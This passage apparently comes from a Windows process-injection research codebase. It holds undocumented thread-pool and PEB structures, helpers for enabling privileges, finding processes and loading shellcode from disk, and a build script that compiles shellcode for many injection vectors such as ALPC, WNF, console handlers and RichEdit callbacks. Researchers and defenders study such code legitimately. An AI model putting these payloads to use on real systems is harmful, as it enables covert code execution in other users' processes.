    LIST_ENTRY                        UnknownList2;
    
} TP_POOL, *PTP_POOL;

typedef struct _TP_WORK {
    TP_CALLBACK_OBJECT                CallbackObject;
    PVOID                             TaskId;
    ULONG64                           Unknown[4];
} TP_WORK, *PTP_WORK;

typedef struct _TP_TIMER {
    TP_CALLBACK_OBJECT                CallBackObject;
    PVOID                             TaskId;
    ULONG64                           Unknown1;
    LIST_ENTRY                        UnknownList1;
    ULONG                             Unknown2;
    SRWLOCK                           TimerLock;
    LIST_ENTRY                        UnknownList2;
    LIST_ENTRY                        UnknownList3;
    ULONG64                           TimerDueTime;
    LIST_ENTRY                        UnknownList4;
    LIST_ENTRY                        UnknownList5;
    LIST_ENTRY                        UnknownList6;
    ULONG64                           Unknown3;
    ULONG                             WindowLength;
    ULONG                             TimePeriod;
    BOOLEAN                           bFlag1;
    BOOLEAN                           bFlag2;
    BOOLEAN                           bFlag3;
    BOOLEAN                           bFlag4;
    BOOLEAN                           bFlag5;
    BOOLEAN                           bFlag6;
    BOOLEAN                           bFlag7;
    BOOLEAN                           bFlag8;
} TP_TIMER, *PTP_TIMER;

typedef struct _TP_ALPC {
    PVOID                             TaskId;
    ULONG                             NumaRelated1[2];
    LIST_ENTRY                        CleanupGroupList;
    PTP_SIMPLE_CALLBACK               FinalizationCallback;
    LIST_ENTRY                        AlpcList;
    PVOID                             ExecuteCallback;
    ULONG                             NumaRelated2[2];
    TP_CALLBACK_OBJECT                CallbackObject;
    HANDLE                            Port;
    HANDLE                            Semaphore;
    ULONG                             NumaRelated;
    ULONG                             Flag;
} TP_ALPC, *PTP_ALPC;    

typedef struct _TP_CALLBACK_INSTANCE {
    ULONG64                           Unknown1[10];
    ULONG64                           SubProcessTag;
    TP_SIMPLE_CALLBACK                Callback; 
    ULONG64                           Unknown2[4];
    PVOID                             TpWork;           // PTP_ALPC for print spooler
    ULONG64                           Unknown3[3];
    HMODULE                           Dll;
    PTP_TIMER                         Timer;
    PTP_CALLBACK_OBJECT               CallbackObject;
} TP_CALLBACK_INSTANCE, *PTP_CALLBACK_INSTANCE;

typedef struct _TP_WORKER_LIST {
    LIST_ENTRY                        TppWorkerpList;
    LIST_ENTRY                        TppPoolList;
    ULONG64                           Unknown1;
    ULONG64                           ThreadId;
    PTP_POOL                          Pool;
    BYTE                              Unknown[248];
} TP_WORKER_LIST, *PTP_WORKER_LIST;

typedef struct _TP_POOL_CALLBACK {
    TP_SIMPLE_CALLBACK                Callback;
    ULONG64                           SubProcessTag;
    ULONG64                           TimeRelated;
} TP_POOL_CALLBACK, *PTP_POOL_CALLBACK;

typedef struct _TP_POOL_DATA {
    PTP_WORKER_LIST                   Workers;
    ULONG                             PoolStatus;
    ULONG                             RefCount;
    ULONG64                           CallbackCount;
    ULONG64                           TimeRelated;
    TP_POOL_CALLBACK                  CallbackArray[2];
    ULONG64                           Reserved[5];
} TP_POOL_DATA, *PTP_POOL_DATA;

#endif
```

`ntlib/util.h`:

```h
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#ifndef UTIL_H
#define UTIL_H

#pragma warning(disable : 4005)
#pragma warning(disable : 4311)
#pragma warning(disable : 4312)

#define UNICODE
#define _WIN32_DCOM

#include <winsock2.h>
#include <ws2tcpip.h>
#include <Windows.h>
#include <processsnapshot.h>
#include <memoryapi.h>
#include <Wbemidl.h>
#include <iphlpapi.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <shlwapi.h>
#include <dbghelp.h>
#include <richedit.h>
#include <shlobj.h>

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <stddef.h>
#include <wchar.h>

#include "../NTlib/nttpp.h"

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleAut32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "winspool.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "OneCore.lib")

// Relative Virtual Address to Virtual Address
#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

// allocate memory
LPVOID xmalloc (SIZE_T dwSize) {
    return HeapAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
}

// re-allocate memory
LPVOID xrealloc (LPVOID lpMem, SIZE_T dwSize) { 
    return HeapReAlloc (GetProcessHeap(), HEAP_ZERO_MEMORY, lpMem, dwSize);
}

// free memory
void xfree (LPVOID lpMem) {
    HeapFree (GetProcessHeap(), 0, lpMem);
}

#if !defined (__GNUC__)
/**
 *
 * Returns TRUE if process token is elevated
 *
 */
BOOL IsElevated(VOID) {
    HANDLE          hToken;
    BOOL            bResult = FALSE;
    TOKEN_ELEVATION te;
    DWORD           dwSize;
      
    if (OpenProcessToken (GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
      if (GetTokenInformation (hToken, TokenElevation, &te,
          sizeof(TOKEN_ELEVATION), &dwSize)) {
        bResult = te.TokenIsElevated;
      }
      CloseHandle(hToken);
    }
    return bResult;
}
#endif

// display error message for last error code
VOID xstrerror (PCHAR fmt, ...){
    PCHAR  error=NULL;
    va_list arglist;
    WCHAR   buffer[1024];
    DWORD   dwError=GetLastError();
    
    va_start(arglist, fmt);
    _vsnwprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
          (LPWSTR)&error, 0, NULL))
    {
      wprintf(L"  [ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      wprintf(L"  [ %s error : %08lX\n", buffer, dwError);
    }
}

// enable or disable a privilege in current process token
BOOL SetPrivilege(PCHAR szPrivilege, BOOL bEnable){
    HANDLE           hToken;
    BOOL             bResult;
    LUID             luid;
    TOKEN_PRIVILEGES tp;

    // open token for current process
    bResult = OpenProcessToken(GetCurrentProcess(),
      TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    if(!bResult)return FALSE;
    
    // lookup privilege
    bResult = LookupPrivilegeValueW(NULL, szPrivilege, &luid);
    
    if (bResult) {
      tp.PrivilegeCount           = 1;
      tp.Privileges[0].Luid       = luid;
      tp.Privileges[0].Attributes = bEnable?SE_PRIVILEGE_ENABLED:SE_PRIVILEGE_REMOVED;

      // adjust token
      AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
      bResult = GetLastError() == ERROR_SUCCESS;
    }
    CloseHandle(hToken);
    return bResult;
}

DWORD name2pid(LPWSTR ImageName) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          dwPid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if (lstrcmpi(ImageName, pe32.szExeFile)==0) {
          dwPid = pe32.th32ProcessID;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return dwPid;
}

PCHAR pid2name(DWORD pid) {
    HANDLE         hSnap;
    BOOL           bResult;
    PROCESSENTRY32 pe32;
    PCHAR         name=L"N/A";
    
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnap != INVALID_HANDLE_VALUE) {
      pe32.dwSize = sizeof(PROCESSENTRY32);
      
      bResult = Process32First(hSnap, &pe32);
      while (bResult) {
        if (pe32.th32ProcessID == pid) {
          name = pe32.szExeFile;
          break;
        }
        bResult = Process32Next(hSnap, &pe32);
      }
      CloseHandle(hSnap);
    }
    return name;
}

LPVOID GetRemoteModuleHandle(DWORD pid, LPCWSTR lpModuleName) {
    HANDLE        ss;
    MODULEENTRY32 me;
    LPVOID        ba = NULL;
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    
    if(ss == INVALID_HANDLE_VALUE) return NULL;
    
    me.dwSize = sizeof(MODULEENTRY32);
    
    if(Module32First(ss, &me)) {
      do {
        if(me.th32ProcessID == pid) {
          if(lstrcmpi(me.szModule, lpModuleName)==0) {
            ba = me.modBaseAddr;
            break;
          }
        }
      } while(Module32Next(ss, &me));
    }
    CloseHandle(ss);
    return ba;
}

PCHAR addr2sym(HANDLE hp, LPVOID addr) {
    WCHAR        path[MAX_PATH];
    BYTE         buf[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO si=(PSYMBOL_INFO)buf;
    static WCHAR name[MAX_PATH];
    
    ZeroMemory(path, ARRAYSIZE(path));
    ZeroMemory(name, ARRAYSIZE(name));
          
    GetMappedFileName(
      hp, addr, path, MAX_PATH);
    
    PathStripPath(path);
    
    si->SizeOfStruct = sizeof(SYMBOL_INFO);
    si->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, (DWORD64)addr, NULL, si)) {
      wsprintf(name, L"%s!%hs", path, si->Name);
    } else {
      lstrcpy(name, path);
    }
    return name;
}

PCHAR wnd2proc(HWND hw) {
    PCHAR         name=L"N/A";
    DWORD          pid;
    HANDLE         ss;
    BOOL           bResult;
    PROCESSENTRY32 pe;
    
    GetWindowThreadProcessId(hw, &pid);
    
    ss = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if(ss != INVALID_HANDLE_VALUE) {
      pe.dwSize = sizeof(PROCESSENTRY32);
      
      bResult = Process32First(ss, &pe);
      while (bResult) {
        if (pe.th32ProcessID == pid) {
          name = pe.szExeFile;
          break;
        }
        bResult = Process32Next(ss, &pe);
      }
      CloseHandle(ss);
    }
    return name;
}

void ShowProcessIntegrityLevel(DWORD pid)
{
 HANDLE hToken;
 HANDLE hProcess;

 DWORD dwLengthNeeded;
 DWORD dwError = ERROR_SUCCESS;

 PTOKEN_MANDATORY_LABEL pTIL = NULL;
 LPWSTR pStringSid;
 DWORD dwIntegrityLevel;
 
 hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,pid);
 if (OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) 
 {
  // Get the Integrity level.
  if (!GetTokenInformation(hToken, TokenIntegrityLevel, 
      NULL, 0, &dwLengthNeeded))
  {
   dwError = GetLastError();
   if (dwError == ERROR_INSUFFICIENT_BUFFER)
   {
    pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, 
         dwLengthNeeded);
    if (pTIL != NULL)
    {
     if (GetTokenInformation(hToken, TokenIntegrityLevel, 
         pTIL, dwLengthNeeded, &dwLengthNeeded))
     {
      dwIntegrityLevel = *GetSidSubAuthority(pTIL->Label.Sid, 
        (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid)-1));
 
      if (dwIntegrityLevel == SECURITY_MANDATORY_LOW_RID)
      {
       // Low Integrity
       wprintf(L"Low");
      }
      else if (dwIntegrityLevel >= SECURITY_MANDATORY_MEDIUM_RID && 
           dwIntegrityLevel < SECURITY_MANDATORY_HIGH_RID)
      {
       // Medium Integrity
       wprintf(L"Medium");
      }
      else if (dwIntegrityLevel >= SECURITY_MANDATORY_HIGH_RID)
      {
       // High Integrity
       wprintf(L"High Integrity");
      }
      else if (dwIntegrityLevel >= SECURITY_MANDATORY_SYSTEM_RID)
      {
       // System Integrity
       wprintf(L"System Integrity");
      }
     }
     LocalFree(pTIL);
    }
   }
  }
  CloseHandle(hToken);
 }
 CloseHandle(hProcess);
 putchar('\n');
}

/**
  read a shellcode from disk into memory
*/
DWORD readpic(PCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len, rd=0;
    
    // 1. open the file
    hf = CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(hf != INVALID_HANDLE_VALUE){
      // get file size
      len = GetFileSize(hf, 0);
      // allocate memory
      *pic = malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

// returns TRUE if ptr is heap
BOOL IsHeapPtr(LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_PRIVATE   ) && 
            (mbi.Protect == PAGE_READWRITE));
}

// returns TRUE if ptr is .data
BOOL IsDataPtr(LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_IMAGE     ) && 
            (mbi.Protect == PAGE_READWRITE));
}

// returns TRUE if ptr is RX code
BOOL IsCodePtr(LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_IMAGE     ) && 
            (mbi.Protect == PAGE_EXECUTE_READ));
}

BOOL IsCodePtrEx(HANDLE hp, LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQueryEx(hp, ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT    ) &&
            (mbi.Type    == MEM_IMAGE     ) && 
            (mbi.Protect == PAGE_EXECUTE_READ));
}

BOOL IsMapPtr(LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return ((mbi.State   == MEM_COMMIT) &&
            (mbi.Type    == MEM_MAPPED));
}

BOOL IsReadWritePtr(LPVOID ptr) {
    MEMORY_BASIC_INFORMATION mbi;
    DWORD                    res;
    
    if(ptr == NULL) return FALSE;
    
    // query the pointer
    res = VirtualQuery(ptr, &mbi, sizeof(mbi));
    if(res != sizeof(mbi)) return FALSE;

    return (mbi.Protect == PAGE_READWRITE);    
}

#endif
```

`payload/x64/Conhost.txt`:

```txt
GetWindowHandle
FindExport
xGetProcAddress
xstrcmp

```

`payload/x64/ListView.txt`:

```txt
Pfnlvgroupcompare
FindExport
xGetProcAddress
xstrcmp

```

`payload/x64/alpc.txt`:

```txt
TpAlpcCallBack
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/autocourgette.txt`:

```txt
Autocorrectproc
FindExport
xGetProcAddress
xstrcmp

```

`payload/x64/build.bat`:

```bat
@echo off
cl -nologo -Os xbin.cpp
echo CONSOLE
cl -DCONSOLE -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@conhost.txt /entry:GetWindowHandle /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\conhost\payload.bin
echo SUBCLASS
cl -DSUBCLASS -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@propagate.txt /entry:SubclassProc /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\propagate\payload.bin
echo WINDOW
cl -DWINDOW -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@extrabytes.txt /entry:WndProc /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\extrabytes\payload.bin
echo Service Control
cl -DSVCCTRL -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@svcctrl.txt /entry:Handler /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\svcctrl\payload.bin
echo ALPC
cl -DALPC -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@alpc.txt /entry:TpAlpcCallBack /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
copy payload.exe64.bin ..\..\alpc\payload.bin
move payload.exe64.bin ..\..\spooler\payload.bin
echo WORDBREAK
cl -DWORDBREAK -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@wordwarping.txt /entry:Editwordbreakproca /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\richedit\wordbreak.bin
echo HYPHENATE
cl -DHYPHENATE -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@hyphentension.txt /entry:HyphenateProc /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\richedit\hyphenate.bin
echo AUTOCORRECT
cl -DAUTOCORRECT -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@autocourgette.txt /entry:Autocorrectproc /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\richedit\autocorrect.bin
echo STREAM
cl -DSTREAM -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@streamception.txt /entry:Editstreamcallback /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\richedit\stream.bin
echo CLIPBOARD
cl -DCLIPBOARD -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@clipboard.txt /entry:OleGetClipboardData /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\richedit\clipboard.bin
echo LVCOMPARE
cl -DLVCOMPARE -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@listview.txt /entry:Pfnlvgroupcompare /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\richedit\listview.bin
echo TVCOMPARE
cl -DTVCOMPARE -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@treeview.txt /entry:TvCompareFunc /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\richedit\treeview.bin
echo RELEASE
cl -DRELEASE -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@release.txt /entry:Release /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
copy payload.exe64.bin ..\..\clipboard\release.bin
move payload.exe64.bin ..\..\tooltip\release.bin
echo WNF
cl -DWNF -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@wnf.txt /entry:WnfCallback /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\wnf\payload.bin
echo WINSOCK
cl -DWINSOCK -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@winsock.txt /entry:WSHGetSocketInformation /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\wsh\payload.bin
echo DDE
cl -DDDE -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@dde.txt /entry:DDECallback /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\dde\payload.bin
echo QUERYINTERFACE
cl -DQUERYINTERFACE -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@queryinterface.txt /entry:QueryInterface /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\tooltip\queryinterface.bin
echo CTRL
cl -DCTRL -c -nologo -Os -O2 -Gm- -GR- -EHa -Oi -GS- payload.c
link /order:@ctrl.txt /entry:HandlerRoutine /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\ctrlinject\handler.bin
echo ETW
cl -DETW -c -nologo -Os -O2 -GS- payload.c
link /order:@etw.txt /entry:EtwEnableCallback /fixed payload.obj -subsystem:console -nodefaultlib -stack:0x100000,0x100000
xbin payload.exe .text
move payload.exe64.bin ..\..\etw\callback.bin
```

`payload/x64/clipboard.txt`:

```txt
OleGetClipboardData
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/ctrl.txt`:

```txt
HandlerRoutine
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/dde.txt`:

```txt
DDECallback
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/etw.txt`:

```txt
EtwEnableCallback
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/extrabytes.txt`:

```txt
WndProc
FindExport
xGetProcAddress
xstrcmp
```

`payload/x64/getapi.h`:

```h
/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#ifndef GETAPI_H
#define GETAPI_H

#include <windows.h>
#include <stdint.h>
#include <stdio.h>

#ifndef _MSC_VER
#ifdef __i386__
/* for x86 only */
unsigned long __readfsdword(unsigned long Offset)
{
   unsigned long ret;
   __asm__ volatile ("movl  %%fs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) Offset)));
   return ret;
}
#else
/* for __x86_64 only */
unsigned __int64 __readgsqword(unsigned long Offset)
{
   void *ret;
   __asm__ volatile ("movq  %%gs:%1,%0"
     : "=r" (ret) ,"=m" ((*(volatile long *) (unsigned __int64) Offset)));
   return (unsigned __int64) ret;
}
#endif
#endif

#define RVA2VA(type, base, rva) (type)((ULONG_PTR) base + rva)

typedef void *PPS_POST_PROCESS_INIT_ROUTINE;

typedef struct _LSA_UNICODE_STRING {
  USHORT Length;
  USHORT MaximumLength;
  PWSTR  Buffer;
} LSA_UNICODE_STRING, *PLSA_UNICODE_STRING, UNICODE_STRING, *PUNICODE_STRING;

typedef struct _RTL_USER_PROCESS_PARAMETERS {
  BYTE           Reserved1[16];
  PVOID          Reserved2[10];
  UNICODE_STRING ImagePathName;
  UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

// PEB defined by rewolf
// http://blog.rewolf.pl/blog/?p=573
typedef struct _PEB_LDR_DATA {
  ULONG      Length;
  BOOL       Initialized;
  LPVOID     SsHandle;
  LIST_ENTRY InLoadOrderModuleList;
  LIST_ENTRY InMemoryOrderModuleList;
  LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY
{
  LIST_ENTRY     InLoadOrderLinks;
  LIST_ENTRY     InMemoryOrderLinks;
  LIST_ENTRY     InInitializationOrderLinks;
  LPVOID         DllBase;
  LPVOID         EntryPoint;
  ULONG          SizeOfImage;
  UNICODE_STRING FullDllName;
  UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
  BYTE                         InheritedAddressSpace;
  BYTE                         ReadImageFileExecOptions;
  BYTE                         BeingDebugged;
  BYTE                         _SYSTEM_DEPENDENT_01;

  LPVOID                       Mutant;
  LPVOID                       ImageBaseAddress;

  PPEB_LDR_DATA                Ldr;
  PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
  LPVOID                       SubSystemData;
  LPVOID                       ProcessHeap;
  LPVOID                       FastPebLock;
  LPVOID                       _SYSTEM_DEPENDENT_02;
  LPVOID                       _SYSTEM_DEPENDENT_03;
  LPVOID                       _SYSTEM_DEPENDENT_04;
  union {
    LPVOID                     KernelCallbackTable;
    LPVOID                     UserSharedInfoPtr;
  };  
  DWORD                        SystemReserved;
  DWORD                        _SYSTEM_DEPENDENT_05;
  LPVOID                       _SYSTEM_DEPENDENT_06;
  LPVOID                       TlsExpansionCounter;
  LPVOID                       TlsBitmap;
  DWORD                        TlsBitmapBits[2];
  LPVOID                       ReadOnlySharedMemoryBase;
  LPVOID                       _SYSTEM_DEPENDENT_07;
  LPVOID                       ReadOnlyStaticServerData;
  LPVOID                       AnsiCodePageData;
  LPVOID                       OemCodePageData;
  LPVOID                       UnicodeCaseTableData;
  DWORD                        NumberOfProcessors;
  union
  {
    DWORD                      NtGlobalFlag;
    LPVOID                     dummy02;
  };
  LARGE_INTEGER                CriticalSectionTimeout;
  LPVOID                       HeapSegmentReserve;
  LPVOID                       HeapSegmentCommit;
  LPVOID                       HeapDeCommitTotalFreeThreshold;
  LPVOID                       HeapDeCommitFreeBlockThreshold;
  DWORD                        NumberOfHeaps;
  DWORD                        MaximumNumberOfHeaps;
  LPVOID                       ProcessHeaps;
  LPVOID                       GdiSharedHandleTable;
  LPVOID                       ProcessStarterHelper;
  LPVOID                       GdiDCAttributeList;
  LPVOID                       LoaderLock;
  DWORD                        OSMajorVersion;
  DWORD                        OSMinorVersion;
  WORD                         OSBuildNumber;
  WORD                         OSCSDVersion;
  DWORD                        OSPlatformId;
  DWORD                        ImageSubsystem;
  DWORD                        ImageSubsystemMajorVersion;
  LPVOID                       ImageSubsystemMinorVersion;
  union
  {
    LPVOID                     ImageProcessAffinityMask;
    LPVOID                     ActiveProcessAffinityMask;
  };
  #ifdef _WIN64
  LPVOID                       GdiHandleBuffer[64];
  #else
  LPVOID                       GdiHandleBuffer[32];
  #endif  
  LPVOID                       PostProcessInitRoutine;
  LPVOID                       TlsExpansionBitmap;
  DWORD                        TlsExpansionBitmapBits[32];
  LPVOID                       SessionId;
  ULARGE_INTEGER               AppCompatFlags;
  ULARGE_INTEGER               AppCompatFlagsUser;
  LPVOID                       pShimData;
  LPVOID                       AppCompatInfo;
  PUNICODE_STRING              CSDVersion;
  LPVOID                       ActivationContextData;
  LPVOID                       ProcessAssemblyStorageMap;
  LPVOID                       SystemDefaultActivationContextData;
  LPVOID                       SystemAssemblyStorageMap;
  LPVOID                       MinimumStackCommit;  
} PEB, *PPEB;

#endif
  
  
```

`payload/x64/hyphentension.txt`:

```txt
